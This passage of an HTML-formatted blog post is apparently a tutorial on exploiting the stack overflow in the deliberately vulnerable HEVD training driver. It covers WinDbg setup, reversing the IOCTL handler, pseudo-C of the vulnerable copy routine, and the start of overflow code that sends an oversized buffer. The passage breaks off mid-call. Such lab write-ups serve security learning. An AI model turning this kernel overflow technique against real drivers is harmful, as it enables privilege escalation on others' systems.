+&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xcopy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;HOMEPATH&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;\&lt;span class="n"&gt;Desktop&lt;/span&gt;\&lt;span class="n"&gt;AMD64&lt;/span&gt;\&lt;span class="o"&gt;*.&lt;/span&gt;&lt;span class="n"&gt;pdb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;\&lt;span class="n"&gt;symbols&lt;/span&gt;\&lt;span class="n"&gt;hevd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pdb&lt;/span&gt;\&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="n"&gt;F6551A1E31E4F65B536C8DCB40F999B1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can use WinDbg to check that:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;the HEVD driver is properly loaded:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;kd&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;lm&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;HEVD&lt;/span&gt;
+&lt;span class="nv"&gt;start&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="w"&gt;                 &lt;/span&gt;&lt;span class="nv"&gt;module&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;name&lt;/span&gt;
+&lt;span class="nv"&gt;fffff800&lt;/span&gt;`&lt;span class="nv"&gt;c1e39000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;fffff800&lt;/span&gt;`&lt;span class="nv"&gt;c1e42000&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nv"&gt;HEVD&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;deferred&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;WinDbg can retrieve its symbols:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;kd&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sympath&lt;/span&gt;
+&lt;span class="n"&gt;Symbol&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;srv&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;\&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;msdl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;microsoft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;download&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;
+
+&lt;span class="n"&gt;kd&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HEVD&lt;/span&gt;&lt;span class="o"&gt;!*&lt;/span&gt;
+&lt;span class="n"&gt;fffff800&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;c1e3c110&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HEVD&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;g_UseAfterFreeObject&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x00000000&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="mi"&gt;00000000&lt;/span&gt;
+&lt;span class="n"&gt;fffff800&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;c1e3c108&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HEVD&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;__security_cookie_complement&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xffff07ff&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="mf"&gt;3e1&lt;/span&gt;&lt;span class="n"&gt;c34a0&lt;/span&gt;
+&lt;span class="n"&gt;fffff800&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;c1e3b368&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HEVD&lt;/span&gt;&lt;span class="o"&gt;!$&lt;/span&gt;&lt;span class="n"&gt;xdatasym&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;fffff800&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;c1e3b388&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HEVD&lt;/span&gt;&lt;span class="o"&gt;!$&lt;/span&gt;&lt;span class="n"&gt;xdatasym&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x01&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;fffff800&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;c1e3c000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HEVD&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;HotPatchBuffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_PATCH_BUFFER&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Last, you may overwrite the &lt;code&gt;nt!Kd_Default_Mask&lt;/code&gt; to increase/decrease Windows kernel
+verbosity from WinDbg&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; ed nt!Kd_Default_Mask 0xf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;However, my preferred approach is to edit the registry on the debuggee to always
+print debug info. This can be done via the key
+&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter&lt;/code&gt; in an
+Admin command prompt:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;C:&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;reg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DEFAULT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;REG_DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0&lt;/span&gt;&lt;span class="n"&gt;xf&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Quick tip&lt;/strong&gt;: use &lt;code&gt;kd&lt;/code&gt; command &lt;code&gt;!dbgprint&lt;/code&gt; to navigate through the DbgPrint buffer.&lt;/p&gt;
+&lt;p&gt;We're ready dive in!&lt;/p&gt;
+&lt;h1&gt;Reverse-Engineering HEVD.sys&lt;/h1&gt;
+&lt;p&gt;Although the
+&lt;a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver"&gt;source code&lt;/a&gt; of
+the entire driver is freely accessible, going black-box reversing (i.e. without
+any source code) is a good practice for real-life bug hunting. Moreover, the
+driver is well written, no obfuscation/packing in place, and the symbols
+are provided, to greatly improve the reversing process.&lt;/p&gt;
+&lt;h2&gt;Hunting the vulnerability&lt;/h2&gt;
+&lt;h3&gt;Talking to the HEVD driver&lt;/h3&gt;
+&lt;p&gt;Any Windows driver must  define an entry point by which Windows can load
+it. This is done with
+the
+&lt;a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff544113(v=vs.85).aspx"&gt;DriverEntry&lt;/a&gt;
+routine whose signature is as follow:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;NTSTATUS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DriverEntry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;_In_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;_DRIVER_OBJECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;DriverObject&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;_In_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PUNICODE_STRING&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;RegistryPath&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;WinDbg confirms that immediately:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; x HEVD!DriverEntry
+fffff800`c1e41008 HEVD!DriverEntry (struct _DRIVER_OBJECT &lt;span class="gs"&gt;*, struct _UNICODE_STRING *&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;By checking this function in IDA Pro, we spot immediately that the driver
+creates a device called &lt;code&gt;\Device\HackSysExtremeVulnerableDriver&lt;/code&gt; via the
+routine
+&lt;a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff548397(v=vs.85).aspx"&gt;&lt;code&gt;IoCreateDevice&lt;/code&gt;&lt;/a&gt;,
+with a &lt;code&gt;DeviceType&lt;/code&gt; set
+as
+&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types"&gt;&lt;code&gt;FILE_DEVICE_UNKNOWN&lt;/code&gt;&lt;/a&gt; -
+or 0x22.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="DriverEntry in IDA" src="/assets/images/win-kernel-debug/hevd-stack-overflow-ida-driver-entry.png"&gt;&lt;/p&gt;
+&lt;p&gt;Then the &lt;code&gt;DriverObject&lt;/code&gt; gets populated with the &lt;a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff544174(v=vs.85).aspx"&gt;structure members&lt;/a&gt; including functions
+pointers, among which we find the IOCTL
+handler, &lt;code&gt;IrpDeviceIoCtlHandler&lt;/code&gt;. This function
+dispatches &lt;a href="https://en.wikipedia.org/wiki/Ioctl"&gt;IOCTL&lt;/a&gt; requests done
+from user-land to the HEVD driver. Every IOCTL is uniquely identified by a specific code, and the handler will basically do a big &lt;code&gt;switch(dwIoControlCode){...}&lt;/code&gt; to execute the corresponding code. IDA is capable of pulling out for us:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/hevd-stack-overflow-ida-ioctl-1.png"&gt;&lt;/p&gt;
+&lt;p&gt;In this first exploitation, we want to reach the &lt;code&gt;StackOverflowIoctlHandler&lt;/code&gt;, and
+therefore need to send a
+&lt;a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx"&gt;&lt;code&gt;DeviceIoControl()&lt;/code&gt;&lt;/a&gt; request with a code set to 0x222003.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: for this initial post, we'll focus on the stack overflow vulnerability, but future posts may
+cover the other vulnerabilities in the HEVD driver, for which we'll only need to change the &lt;code&gt;dwIoControlCode&lt;/code&gt; value in order to reach them.&lt;/p&gt;
+&lt;p&gt;So we know how to reach the driver and the targeted function, which would look
+like (in pseudo-C):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#define IOCTL_HEVD_STACK_OVERFLOW 0x222003&lt;/span&gt;
+
+
+&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateFileA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="s"&gt;.&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;HackSysExtremeVulnerableDriver&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+&lt;span class="n"&gt;BOOL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bResult&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IOCTL_HEVD_STACK_OVERFLOW&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;                               &lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dwBufferInLength&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Analyzing the vulnerability&lt;/h3&gt;
+&lt;p&gt;We know how to reach &lt;code&gt;StackOverflowIoctlHandler()&lt;/code&gt; from user-land, and pass in an
+controlled buffer of an arbitrary size. Here is the &lt;code&gt;TriggerStackOverflow&lt;/code&gt; function translated to pseudo-C:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;TriggerStackOverflow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;UserBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;uint64_t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2048&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;ZeroMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;ProbeForRead&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UserBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DbgPrint_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[+] UserBuffer: 0x%p&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UserBuffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DbgPrint_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[+] UserBuffer Size: 0x%X&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DbgPrint_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[+] KernelBuffer: 0x%p&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DbgPrint_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[+] KernelBuffer Size: 0x%X&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;DbgPrint_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[+] Triggering Stack Overflow&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;RtlCopyMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UserBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The code leaves no room for ambiguity about the vulnerability: we can overflow
+the kernel stack by passing in a buffer of length &amp;gt; 0x800 bytes. Since the
+buffer is read directly from user-land
+(&lt;a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff559876(v=vs.85).aspx"&gt;&lt;code&gt;ProbeForRead&lt;/code&gt;&lt;/a&gt;)
+we have full control over it, which simplifies greatly the exploitation.&lt;/p&gt;
+&lt;p&gt;So the exploit code looks clearer:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#define IOCTL_HEVD_STACK_OVERFLOW 0x222003&lt;/span&gt;
+
+
+&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateFileA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="s"&gt;.&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;HackSysExtremeVulnerableDriver&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+
+&lt;span class="n"&gt;LPVOID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VirtualAlloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MEM_COMMIT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MEM_RESERVE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nInBufferSize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x50&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;ZeroMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;RtlFillMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// for now, let&amp;#39;s just populate the stack with &amp;#39;A&amp;#39;&lt;/span&gt;
+
+
+&lt;span class="n"&gt;BOOL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bResult&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IOCTL_HEVD_STACK_OVERFLOW&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
